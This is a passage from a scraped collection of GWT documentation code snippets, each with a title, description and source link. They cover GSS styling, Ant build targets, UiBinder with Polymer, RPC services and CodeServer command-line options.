GSS, class names should not include the dot prefix and wildcard patterns must be quoted.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideGssVsCss.md#2025-04-09_snippet_13\n\nLANGUAGE: css\nCODE:\n```\n/* CSS */\n@external .foo;\n\n/* GSS */\n@external foo;\n\n/* Don't obfuscate the class myLegacyClass and all classes starting with gwt- */\n@external myLegacyClass 'gwt-*';\n```\n\n----------------------------------------\n\nTITLE: Configuring JSP Welcome File in web.xml\nDESCRIPTION: This XML configuration specifies the JSP template as the welcome file for the web application, ensuring that it's served when users access the root URL of the application.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/dynamic_host_page.md#2025-04-09_snippet_7\n\nLANGUAGE: xml\nCODE:\n```\n<welcome-file-list>\n  <welcome-file>gwt-hosting.jsp</welcome-file>\n</welcome-file-list>\n```\n\n----------------------------------------\n\nTITLE: Configuring Development Mode for App Engine in Ant Build XML\nDESCRIPTION: This XML snippet modifies the 'devmode' Ant target to use the App Engine development server instead of the standard GWT servlet container for running the application in development mode.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_6\n\nLANGUAGE: XML\nCODE:\n```\n<target name=\"devmode\" depends=\"javac\" description=\"Run development mode\"\">\n  <java failonerror=\"true\" fork=\"true\" classname=\"com.google.gwt.dev.DevMode\"\">\n    <classpath>\n      <pathelement location=\"src\"/>\n      <path refid=\"project.class.path\"/>\n      <path refid=\"tools.class.path\"/>\n    </classpath>\n    <jvmarg value=\"-Xmx256M\"/>\n    <arg value=\"-startupUrl\"/>\n    <arg value=\"StockWatcher.html\"/>\n    <!-- Additional arguments like -style PRETTY or -logLevel DEBUG -->\n    <arg value=\"-server\"/>\n    <arg value=\"com.google.appengine.tools.development.gwt.AppEngineLauncher\"/>\n    <arg value=\"com.google.gwt.sample.stockwatcher.StockWatcher\"/>\n  </java>\n</target>\n```\n\n----------------------------------------\n\nTITLE: Basic GWT Compiler Configuration in Ant Build File\nDESCRIPTION: Shows the default Ant target for compiling GWT applications to JavaScript. This target sets up the classpath and memory allocation for the GWT compiler.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_DebuggingAndCompiling.md#2025-04-09_snippet_3\n\nLANGUAGE: xml\nCODE:\n```\n<target name=\"gwtc\" depends=\"javac\" description=\"GWT compile to JavaScript\">\n    <java failonerror=\"true\" fork=\"true\" classname=\"com.google.gwt.dev.Compiler\">\n      <classpath>\n        <pathelement location=\"src\"/>\n        <path refid=\"project.class.path\"/>\n      </classpath>\n      <!-- add jvmarg -Xss16M or similar if you see a StackOverflowError -->\n      <jvmarg value=\"-Xmx256M\"/>\n      <!-- Additional arguments like -style PRETTY or -logLevel DEBUG -->\n      <arg value=\"com.google.gwt.sample.hello.Hello\"/>\n    </java>\n  </target>\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom Entity Locator in Java\nDESCRIPTION: This snippet shows how to implement a custom EmployeeLocator that extends the Locator<T,I> interface. This approach allows for separating persistence code from entity classes by implementing the required entity locator methods in a separate class.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideRequestFactory.md#2025-04-09_snippet_9\n\nLANGUAGE: java\nCODE:\n```\npublic class EmployeeLocator extends Locator<Employee, Long> {\n  @Override\n  public Employee create(Class<? extends Employee> clazz)\n  {\n    return new Employee();\n  }\n    ...\n}\n```\n\n----------------------------------------\n\nTITLE: HTML Structure for GWT Download Page\nDESCRIPTION: HTML markup for the GWT download page including sections for the GWT SDK and Eclipse Plugin. Contains download buttons, descriptive text, notes, and navigation links to related documentation.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/download.md#2025-04-09_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n<div class='download-block'>\n  <h3 style=\"margin-top: 0em;\">GWT SDK</h3>\n  <p>\n    The GWT SDK contains the core libraries and compiler that you need to write web applications. See the <a href=\"release-notes.html#Release_Notes_Current\">Release Notes for\n      this latest version</a>.\n  </p>\n  <p style=\"font-size: 90%;\">\n    <b style=\"color: #444;\">Note</b> - This download contains the standalone GWT SDK and tools only. If you're using Eclipse, we suggest that you download and install the GWT Eclipse Plugin instead.\n  </p>\n  <div class='moreinfo'>\n    <a class='download-button' href=\"https://github.com/gwtproject/gwt/releases/download/2.12.2/gwt-2.12.2.zip\">Download GWT SDK</a> <br />\n    <p style='font-size: 85%;'>\n      <a href=\"versions.html\">[Old versions]</a>\n    </p>\n    <p style='font-size: 90%;'>\n      Next: Go to <a href=\"gettingstarted-v2.html\">Getting Started with the GWT SDK</a>\n    </p>\n  </div>\n</div>\n\n<div class='download-block'>\n  <h3 style=\"margin-top: 0em;\">\n    Plugin for Eclipse <span style=\"font-weight: normal; font-size: 95%;\"> (incl. SDKs)</span>\n  </h3>\n  <p>The GWT Eclipse Plugin provides IDE support for GWT projects.</p>\n  <p style=\"font-size: 90%;\">\n    <b style=\"color: #444;\">Note</b> - This download includes Eclipse tools as well as the option to install the GWT SDK.\n  </p>\n  <p style=\"margin-top: 0.5em; font-size: 90%\">\n    <b style=\"color: #444;\">Note</b> - GWT release candidates are not bundled with the GWT Eclipse Plugin. The GWT Eclipse Plugin's version of GWT might also not always be up-to-date.\n  </p>\n  <div class='moreinfo'>\n    <a class='download-button' href=\"http://gwt-plugins.github.io/documentation/gwt-eclipse-plugin/Download.html\">Download Plugin &amp; SDKs</a>\n    <p style='font-size: 90%;'>\n      Next: Go to <a href=\"usingeclipse.html\">Set up Eclipse</a>, then <a href=\"gettingstarted-v2.html\">Build a Sample App</a>\n    </p>\n  </div>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Spanish Localization Properties for GWT i18n\nDESCRIPTION: Spanish translation properties file with localized versions of the string constants. Uses the _es suffix to indicate Spanish locale.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nConstants.md#2025-04-09_snippet_1\n\nLANGUAGE: properties\nCODE:\n```\nhelloWorld = hola, mundo\ngoodbyeWorld = adiós, mundo\n```\n\n----------------------------------------\n\nTITLE: Creating an Ant Target for Copying Static Resources to War Directory\nDESCRIPTION: Demonstrates how to create an Ant target that copies static resources from the source directory to the war output directory for deployment with GWT applications.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_DebuggingAndCompiling.md#2025-04-09_snippet_4\n\nLANGUAGE: xml\nCODE:\n```\n<target name=\"copyresources\" description=\"Copy static resources to war output directory\">\n    <copy todir=\"war/myapp\">\n      <fileset dir=\"src/com/myapp/resources\">\n        <include name=\"**/*\"/>\n      </fileset>\n    </copy>\n  </target>\n```\n\n----------------------------------------\n\nTITLE: JSNI Methods for Accessing JSON Stock Data Properties\nDESCRIPTION: JavaScript Native Interface (JSNI) methods that allow Java code to access JavaScript object properties from the parsed JSON data. These methods provide access to the symbol, price, and change values in the stock data objects.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/JSON.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\n// JSNI methods to get stock data.\npublic final native String getSymbol() /*-{ return this.symbol; }-*/;\npublic final native double getPrice() /*-{ return this.price; }-*/;\npublic final native double getChange() /*-{ return this.change; }-*/;\n```\n\n----------------------------------------\n\nTITLE: Implementing Server Custom Field Serializer in Java\nDESCRIPTION: Example of extending ServerCustomFieldSerializer for HashMap type checking. This shows the basic class declaration pattern required for implementing server-side type checking in GWT RPC custom serializers.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideServerCommunication.md#2025-04-09_snippet_9\n\nLANGUAGE: java\nCODE:\n```\npublic final class HashMap_ServerCustomFieldSerializer extends ServerCustomFieldSerializer<HashMap>\n```\n\n----------------------------------------\n\nTITLE: Defining Constants in GSS vs CSS in GWT\nDESCRIPTION: Demonstrates how to define constants in GSS compared to CSS. GSS requires constants to be defined in upper-case and supports function calls for constant definition.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideGssVsCss.md#2025-04-09_snippet_0\n\nLANGUAGE: css\nCODE:\n```\n/* CSS */\n@def myConstant 12px\n\n/* GSS */\n@def MY_CONSTANT 12px;\n\n/* You can also use any gss function to define a constant */\n@def MARGIN mult(divide(100%, 6), 4);\n```\n\n----------------------------------------\n\nTITLE: Configuring Selenium Run Style in Eclipse VM Arguments\nDESCRIPTION: Demonstrates how to add the Selenium run style configuration to VM arguments when running a test from Eclipse.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideTestingRemoteTesting.md#2025-04-09_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n-Dgwt.args=\"-runStyle Selenium:myhost:4444/*firefox\"\n```\n\n----------------------------------------\n\nTITLE: App Controller Implementation in GWT\nDESCRIPTION: Controller class showing view initialization and column definition setup.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture-2.md#2025-04-09_snippet_11\n\nLANGUAGE: java\nCODE:\n```\npublic class AppController implements Presenter, ValueChangeHandler<String> {\n    ...\n    public void onValueChange(ValueChangeEvent<String> event) {\n      String token = event.getValue();\n      if (token != null) {\n        Presenter presenter = null;\n        if (token.equals(\"list\")) {\n          if (contactsView == null) {\n            contactsView = new ContactsViewImpl<ContactDetails>();\n            if (contactsViewColumnDefinitions == null) {\n              contcactsViewColumnDefinitions = new ContactsViewColumnDefinitions().getColumnDefinitions();\n            }\n            contactsView.setColumnDefiniions(contactsViewColumnDefinitions);\n         }\n        }\n        presenter = new ContactsPresenter(rpcService, eventBus, contactsView);\n      }\n      ...\n    }\n    ...\n  }\n```\n\n----------------------------------------\n\nTITLE: Renaming HTTP Request Method in GWT 1.2\nDESCRIPTION: The addHeader() method in RequestBuilder was renamed to setHeader() to better reflect its purpose. This change only affects users of the new HTTP functionality introduced in GWT 1.2.11.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/release-notes.md#2025-04-09_snippet_19\n\nLANGUAGE: Java\nCODE:\n```\n// Old method name (GWT 1.2 RC)\nrequestBuilder.addHeader(\"Content-Type\", \"application/json\");\n\n// New method name (GWT 1.2 Final)\nrequestBuilder.setHeader(\"Content-Type\", \"application/json\");\n```\n\n----------------------------------------\n\nTITLE: JSON Object Response Example\nDESCRIPTION: Example of a JSON object structure returned from server response containing a data array.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/security_for_gwt_applications.md#2025-04-09_snippet_6\n\nLANGUAGE: json\nCODE:\n```\n{ 'data': ['foo', 'bar'] }\n```\n\n----------------------------------------\n\nTITLE: Inheriting the HTTP Module in GWT\nDESCRIPTION: XML configuration snippet showing how to inherit the GWT HTTP module in your application's module XML file. This is required before using any HTTP functionality.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideServerCommunication.md#2025-04-09_snippet_12\n\nLANGUAGE: xml\nCODE:\n```\n<inherits name=\"com.google.gwt.http.HTTP\" />\n```\n\n----------------------------------------\n\nTITLE: Using @sprite for Background Positioning in CSS2 Browsers\nDESCRIPTION: Demonstrates how to use @sprite for precise background image positioning in CSS2 browsers, which is especially useful for RTL support when pixel-based offsets are needed.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_21\n\nLANGUAGE: css\nCODE:\n```\n@sprite .bgImage {\n    gwt-image: 'background-image';\n    position: absolute;\n    left: 4px;\n    top: 10px;\n}\n```\n\n----------------------------------------\n\nTITLE: Updating GWT Compiler Target to Include Resource Copying\nDESCRIPTION: Shows how to update the GWT compiler Ant target to depend on the resource copying target, ensuring static resources are copied before compilation completes.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_DebuggingAndCompiling.md#2025-04-09_snippet_5\n\nLANGUAGE: xml\nCODE:\n```\n<target name=\"gwtc\" depends=\"javac,copyresources\" description=\"GWT compile to JavaScript\">\n```\n\n----------------------------------------\n\nTITLE: Configuring RTL Image Flipping in GWT ImageResource\nDESCRIPTION: Shows how to configure automatic flipping of images in right-to-left contexts using the @ImageOptions annotation with the flipRtl parameter set to true.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_22\n\nLANGUAGE: java\nCODE:\n```\n@Source(\"icon128.png\")\n@ImageOptions(flipRtl = true)\nImageResource logo();\n```\n\n----------------------------------------\n\nTITLE: Using Configuration Properties in GSS Conditional CSS\nDESCRIPTION: Shows how to use boolean configuration properties in GSS conditional CSS without requiring the is() function. Properties must be single-valued and set to either true or false.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideGssVsCss.md#2025-04-09_snippet_3\n\nLANGUAGE: css\nCODE:\n```\n/* GSS */\n@if (MY_CONFIGURATION_PROPERTY) {\n\n  .foo {...}\n\n} @else {\n\n  .bar {...}\n\n}\n```\n\n----------------------------------------\n\nTITLE: GWT HasText Interface Definition\nDESCRIPTION: This snippet shows the HasText interface from GWT libraries. It defines methods for getting and setting text, which is used by many GWT components.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/testing_methodologies_using_gwt.md#2025-04-09_snippet_6\n\nLANGUAGE: Java\nCODE:\n```\npackage com.google.gwt.user.client.ui;\n\npublic interface HasText {\n\n  /**\n   * Gets this object's text.\n   */\n  String getText();\n\n  /**\n   * Sets this object's text.\n   *\n   * @param text the object's new text\n   */\n  void setText(String text);\n}\n```\n\n----------------------------------------\n\nTITLE: Defining UI Layout with UiBinder and Polymer Components in XML\nDESCRIPTION: This snippet shows the structure of a Main.ui.xml file using UiBinder to define the UI layout with Polymer components. It includes custom styling, a drawer panel, toolbar, and various paper elements for a todo list application.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/elements-buildui.md#2025-04-09_snippet_11\n\nLANGUAGE: xml\nCODE:\n```\n<ui:UiBinder xmlns:ui='urn:ui:com.google.gwt.uibinder'\n             xmlns:g='urn:import:com.google.gwt.user.client.ui'>\n\n    <g:HTMLPanel>\n        <style is=\"custom-style\">\n            paper-icon-item {\n                position: relative;\n                overflow: hidden;\n            }\n            .toolbar {\n                background: #4285f4 !important;\n            }\n            .header {\n                font-size: 200%;\n                margin-left: 50px;\n            }\n            .content {\n                padding: 15px;\n            }\n            .add {\n                position: absolute;\n                bottom: 20px;\n                right: 20px;\n                --paper-fab-background: var(--paper-red-500);\n            }\n        </style>\n        <paper-drawer-panel ui:field=\"drawerPanel\">\n            <div drawer=\"\">\n                <paper-header-panel mode=\"seamed\">\n                    <paper-toolbar class=\"toolbar\"/>\n                    <paper-icon-item ui:field=\"menuClearAll\">\n                        <iron-icon icon=\"delete\" item-icon=\"\"/>\n                        <div>Clear All</div>\n                        <paper-ripple/>\n                    </paper-icon-item>\n                    <paper-icon-item ui:field=\"menuClearDone\">\n                        <iron-icon icon=\"clear\" item-icon=\"\"/>\n                        <div>Clear Done</div>\n                        <paper-ripple/>\n                    </paper-icon-item>\n                    <paper-icon-item ui:field=\"menuSettings\">\n                        <iron-icon icon=\"settings\" item-icon=\"\"/>\n                        <div>Settings</div>\n                        <paper-ripple/>\n                    </paper-icon-item>\n                    <paper-icon-item ui:field=\"menuAbout\">\n                        <iron-icon icon=\"help\" item-icon=\"\"/>\n                        <div>About</div>\n                        <paper-ripple/>\n                    </paper-icon-item>\n                </paper-header-panel>\n            </div>\n            <div main=\"\">\n                <paper-header-panel mode=\"seamed\">\n                    <paper-toolbar class=\"toolbar\">\n                        <paper-icon-button ui:field=\"menu\" icon=\"more-vert\" paper-drawer-toggle=\"\"/>\n                        <span class=\"header\">Todo List</span>\n                    </paper-toolbar>\n                    <div ui:field=\"content\" class=\"content vertical center-justified layout\"/>\n                </paper-header-panel>\n                <paper-fab ui:field=\"addButton\" icon=\"add\" title=\"add\" class=\"add\"/>\n            </div>\n        </paper-drawer-panel>\n    </g:HTMLPanel>\n</ui:UiBinder>\n```\n\n----------------------------------------\n\nTITLE: Java Widget Attachment Using RootPanel\nDESCRIPTION: Java code demonstrating how to attach GWT widgets to specific HTML elements using RootPanel.get() with element IDs.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideOrganizingProjects.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\nfinal Button button = new Button(\"Click me\");\n    final Label label = new Label();\n\n    ...\n\n    RootPanel.get(\"slot1\").add(button);\n    RootPanel.get(\"slot2\").add(label);\n```\n\n----------------------------------------\n\nTITLE: Copying App Engine Libraries in Ant Build XML\nDESCRIPTION: This XML snippet modifies the 'libs' Ant target to copy the required App Engine jar files to the WEB-INF/lib directory of the project.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_4\n\nLANGUAGE: XML\nCODE:\n```\n<target name=\"libs\" description=\"Copy libs to WEB-INF/lib\">\n  <mkdir dir=\"war/WEB-INF/lib\" />\n  <copy todir=\"war/WEB-INF/lib\" file=\"${gwt.sdk}/gwt-servlet.jar\" />\n  <!-- Add any additional server libs that need to be copied -->\n  <copy todir=\"war/WEB-INF/lib\" flatten=\"true\">\n    <fileset dir=\"${appengine.sdk}/lib/user\" includes=\"**/*.jar\"/>\n  </copy>\n</target>\n```\n\n----------------------------------------\n\nTITLE: Displaying Closed Issue Statuses in Markdown Table\nDESCRIPTION: A markdown table listing and describing the various statuses for closed issues in the GWT project's issue tracker. It includes statuses such as NotPlanned, Invalid, AssumedStale, AsDesigned, KnownQuirk, Duplicate, and CannotReproduce.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/lifeofanissue.md#2025-04-09_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n<table border=\"1\" cellpadding=\"5\" cellspacing=\"0\" width=\"50%\">\n<tbody>\n<tr> \n<th>Status</th> \n<th>Description</th> \n</tr> \n<tr>\n<td></td>\n<td>Fixed in associated milestone (could be a future release of GWT)</td>\n</tr> \n<tr>\n<td>NotPlanned</td>\n<td>No current plans to address this issue</td>\n</tr> \n<tr>\n<td>Invalid</td>\n<td>This was not a valid issue report (e.g. illegible, spam, does not describe a real issue)</td>\n</tr> \n<tr>\n<td>AssumedStale</td>\n<td>Assumed (perhaps incorrectly) to no longer be a problem; please reconfirm with latest release</td>\n</tr> \n<tr>\n<td>AsDesigned</td>\n<td>The feature is behaving as intended</td>\n</tr> \n<tr>\n<td>KnownQuirk</td>\n<td>Not denying it's a real issue, but likely a browser quirk beyond our control to fix efficiently</td>\n</tr> \n<tr>\n<td>Duplicate</td>\n<td>This report duplicates an existing issue</td>\n</tr> \n<tr>\n<td>CannotReproduce</td>\n<td>The issue could not be reproduced based on the report</td>\n</tr> \n</tbody> \n</table>\n```\n\n----------------------------------------\n\nTITLE: Defining Stock RPC Service Interface\nDESCRIPTION: Definition of the Stock RPC service interface for handling stock-related operations.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_19\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.stockwatcher.client;\n\nimport com.google.gwt.user.client.rpc.RemoteService;\nimport com.google.gwt.user.client.rpc.RemoteServiceRelativePath;\n\n@RemoteServiceRelativePath(\"stock\")\npublic interface StockService extends RemoteService {\n  public void addStock(String symbol) throws NotLoggedInException;\n  public void removeStock(String symbol) throws NotLoggedInException;\n  public String[] getStocks() throws NotLoggedInException;\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Child Widget Visibility in GWT LayoutPanel\nDESCRIPTION: This Java code demonstrates the correct way to set a child widget's visibility within a LayoutPanel using the setWidgetVisible method, which properly handles the container element created by the Layout class.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiPanels.md#2025-04-09_snippet_12\n\nLANGUAGE: java\nCODE:\n```\nLayoutPanel panel = ...;\nWidget child;\npanel.add(child);\npanel.setWidgetVisible(child, false);\n```\n\n----------------------------------------\n\nTITLE: Record Entity Constructor with DTO Conversion\nDESCRIPTION: Constructor in Record entity class that creates a Record instance from RecordDTO data.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_14\n\nLANGUAGE: java\nCODE:\n```\npublic Record(RecordDTO record) {\n  id = record.getId();\n  title = record.getTitle();\n  year = record.getYear();\n  price = record.getPrice();\n}\n```\n\n----------------------------------------\n\nTITLE: Image Sprites in GSS vs CSS\nDESCRIPTION: Shows how to define image sprites in GSS compared to CSS. In GSS, sprites are defined using the gwt-sprite property directly within style rules instead of using an @sprite at-rule.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideGssVsCss.md#2025-04-09_snippet_10\n\nLANGUAGE: css\nCODE:\n```\n/* CSS */\n@sprite .logout {\n  gwt-image: \"iconLogin\";\n  display: block;\n  cursor: pointer;\n}\n\n/* GSS */\n.logout {\n    gwt-sprite: \"iconLogin\";\n    display: block;\n    cursor: pointer;\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing Rendered Elements in UiRenderer for GWT\nDESCRIPTION: This example shows how to access and manipulate rendered elements in a UiRenderer for GWT. It demonstrates defining a getter for a specific element and using it in an event handler.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_34\n\nLANGUAGE: java\nCODE:\n```\ninterface MyUiRenderer extends UiRenderer {\n  // ... snip ...\n  SpanElement getNameSpan(Element parent);\n  // ... snip ...\n}\n\n@UiHandler({\"nameSpan\"})\nvoid onNameGotPressed(ClickEvent event, Element parent, String name) {\n  renderer.getNameSpan(parent).setInnerText(name + \", dude!\");\n}\n```\n\n----------------------------------------\n\nTITLE: Styling the Developer Spotlight Page with CSS\nDESCRIPTION: CSS styling for a developer showcase page that defines layout styles for video content and application showcases. It includes formatting for screenshots, descriptions, and titles, with specific width, padding, and alignment properties to create a consistent visual presentation.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/developer_spotlight.md#2025-04-09_snippet_0\n\nLANGUAGE: CSS\nCODE:\n```\n<style>\n   #body {\n     max-width: 700px;\n   }\n   .video {\n     clear: both;\n     width: 100%;\n     overflow: visible;\n     padding: 5px;\n   }\n\n   .video .screenshot {\n     padding-left: 15px;\n     padding-top: 20px;\n     padding-bottom: 20px;\n     vertical-align: middle;\n   }\n\n   .video .description {\n     padding-top: 5px;\n     padding-bottom: 5px;\n     vertical-align: middle;\n   }\n\n   .video .description .title {\n     font-weight: bold;\n   }\n\n   .application {\n     clear: both;\n     width: 100%;\n     overflow: visible;\n     padding: 5px;\n   }\n\n   .application .screenshot {\n     padding-left: 15px;\n     padding-top: 20px;\n     padding-bottom: 20px;\n   }\n\n   .application .description {\n     vertical-align: middle;\n   }\n\n   .application .description .title {\n     font-weight: bold;\n   }\n   </style>\n```\n\n----------------------------------------\n\nTITLE: Implementing GWT Entry Point with Main Screen\nDESCRIPTION: Creates the TodoList entry point class that implements EntryPoint interface. It adds the Main composite widget to the RootPanel when the application loads.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/widgets-buildui.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\npackage org.gwtproject.tutorial;\n\nimport com.google.gwt.core.client.EntryPoint;\nimport com.google.gwt.user.client.ui.RootPanel;\n\npublic class TodoList implements EntryPoint {\n\n  public void onModuleLoad() {\n    RootPanel.get().add(new Main());\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Empty Web App Configuration\nDESCRIPTION: Minimal web.xml configuration after removing greetServlet\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/create.md#2025-04-09_snippet_6\n\nLANGUAGE: xml\nCODE:\n```\n<web-app>\n</web-app>\n```\n\n----------------------------------------\n\nTITLE: Initializing Stock Price Constants - Java\nDESCRIPTION: Defines constant values for maximum stock price and price change percentage\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/RPC.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\nprivate static final double MAX_PRICE = 100.0; // $100.00\nprivate static final double MAX_PRICE_CHANGE = 0.02; // +/- 2%\n```\n\n----------------------------------------\n\nTITLE: Building a GWT Application for Production\nDESCRIPTION: Command to compile a GWT application into JavaScript and HTML using Ant for deployment in production mode.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/gettingstarted.md#2025-04-09_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\nant build\n```\n\n----------------------------------------\n\nTITLE: Adding Ripple Effects to Menu Items in GWT Polymer Application\nDESCRIPTION: This updated XML template adds paper-ripple elements to each menu item to create Material Design ripple effects. CSS styling is added to constrain the ripple effects within the menu items by setting position to relative and hiding overflow.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/elements-buildui.md#2025-04-09_snippet_5\n\nLANGUAGE: xml\nCODE:\n```\n<ui:UiBinder xmlns:ui='urn:ui:com.google.gwt.uibinder'\n             xmlns:g='urn:import:com.google.gwt.user.client.ui'>\n\n    <g:HTMLPanel>\n        <style>\n            paper-icon-item {\n                position: relative;\n                overflow: hidden;\n            }\n        </style>\n        <paper-icon-item ui:field=\"menuClearAll\">\n            <iron-icon icon=\"delete\" item-icon=\"\"/>\n            <div>Clear All</div>\n            <paper-ripple/>\n        </paper-icon-item>\n        <paper-icon-item ui:field=\"menuClearDone\">\n            <iron-icon icon=\"clear\" item-icon=\"\"/>\n            <div>Clear Done</div>\n            <paper-ripple/>\n        </paper-icon-item>\n        <paper-icon-item ui:field=\"menuSettings\">\n            <iron-icon icon=\"settings\" item-icon=\"\"/>\n            <div>Settings</div>\n            <paper-ripple/>\n        </paper-icon-item>\n        <paper-icon-item ui:field=\"menuAbout\">\n            <iron-icon icon=\"help\" item-icon=\"\"/>\n            <div>About</div>\n            <paper-ripple/>\n        </paper-icon-item>\n    </g:HTMLPanel>\n</ui:UiBinder>\n```\n\n----------------------------------------\n\nTITLE: CodeServer Command Line Output for GWT 2.12.2\nDESCRIPTION: Output from running the CodeServer command without arguments, showing available options for launching Super Dev Mode's code server in GWT 2.12.2.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/superdevmode.md#2025-04-09_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nGoogle Web Toolkit 2.12.2\nCodeServer [-[no]allowMissingSrc] [-[no]compileTest] [-compileTestRecompiles count] [-[no]failOnError] [-[no]precompile] [-port port] [-src dir] [-workDir dir] [-launcherDir] [-bindAddress host-name-or-address] [-style (DETAILED|OBFUSCATED|PRETTY)] [-setProperty name=value,value...] [-[no]incremental] [-sourceLevel [auto, 1.8, 9, 10, 11, 17]] [-logLevel (ERROR|WARN|INFO|TRACE|DEBUG|SPAM|ALL)] [-[no]generateJsInteropExports] [-includeJsInteropExports/excludeJsInteropExports regex] [-XmethodNameDisplayMode (NONE|ONLY_METHOD_NAME|ABBREVIATED|FULL)] [-X[no]closureFormattedOutput] [module]\n\nwhere\n  -[no]allowMissingSrc                              Allows -src flags to reference missing directories. (defaults to OFF)\n  -[no]compileTest                                  Exits after compiling the modules. The exit code will be 0 if the compile succeeded. (defaults to OFF)\n  -compileTestRecompiles                            The number of times to recompile (after the first one) during a compile test.\n  -[no]failOnError                                  Stop compiling if a module has a Java file with a compile error, even if unused. (defaults to OFF)\n  -[no]precompile                                   Precompile modules. (defaults to ON)\n  -port                                             The port where the code server will run.\n  -src                                              A directory containing GWT source to be prepended to the classpath for compiling.\n  -workDir                                          The root of the directory tree where the code server willwrite compiler output. If not supplied, a temporary directorywill be used.\n  -launcherDir                                      An output directory where files for launching Super Dev Mode will be written. (Optional.)\n  -bindAddress                                      Specifies the bind address for the code server and web server (defaults to 127.0.0.1)\n  -style                                            Script output style: DETAILED, OBFUSCATED or PRETTY\n  -setProperty                                      Set the values of a property in the form of propertyName=value1[,value2...].\n  -[no]incremental                                  Compiles faster by reusing data from the previous compile. (defaults to ON)\n  -sourceLevel                                      Specifies Java source level (defaults to 1.8)\n  -logLevel                                         The level of logging detail: ERROR, WARN, INFO, TRACE, DEBUG, SPAM or ALL (defaults to INFO)\n  -[no]generateJsInteropExports                     Generate exports for JsInterop purposes. If no -includeJsInteropExport/-excludeJsInteropExport provided, generates all exports. (defaults to OFF)\n  -includeJsInteropExports/excludeJsInteropExports  Include/exclude members and classes while generating JsInterop exports. Flag could be set multiple times to expand the pattern. (The flag has only effect if exporting is enabled via -generateJsInteropExports)\n  -XmethodNameDisplayMode                           EXPERIMENTAL: Specifies method display name mode for chrome devtools: NONE, ONLY_METHOD_NAME, ABBREVIATED or FULL (defaults to NONE)\n  -X[no]closureFormattedOutput                      EXPERIMENTAL: Enables Javascript output suitable for post-compilation by Closure Compiler (defaults to OFF)\nand\n  module                                            The GWT modules that the code server should compile. (Example: com.example.MyApp)\n```\n\n----------------------------------------\n\nTITLE: Launching GWT Development Mode from Command Line\nDESCRIPTION: A shell command example showing how to manually start GWT Development Mode from the command line with memory settings, classpath, and module configuration.\nSOURCE: 